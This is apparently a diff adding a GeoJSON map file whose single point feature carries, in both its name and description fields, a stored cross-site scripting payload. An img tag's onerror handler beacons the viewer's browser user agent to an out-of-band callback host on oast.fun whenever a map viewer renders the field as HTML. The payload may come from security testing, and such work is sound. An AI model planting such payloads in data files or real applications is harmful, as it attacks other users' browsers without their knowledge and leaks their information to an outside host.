@@ -1,0 +1,19 @@
+{
+  "type": "FeatureCollection",
+  "features": [
+    {
+      "type": "Feature",
+      "properties": {
+        "name": "<img src=x onerror=\"new Image().src='https://d964nnd54v9bmv1ife10kzegqiduur6tx.oast.fun/geojson?ua='+encodeURIComponent(navigator.userAgent)+'&t='+Date.now()\">",
+        "description": "<img src=x onerror=\"new Image().src='https://d964nnd54v9bmv1ife10kzegqiduur6tx.oast.fun/geojson?ua='+encodeURIComponent(navigator.userAgent)+'&t='+Date.now()\">"
+      },
+      "geometry": {
+        "type": "Point",
+        "coordinates": [
+          0,
+          0
+        ]
+      }
+    }
+  ]
+}
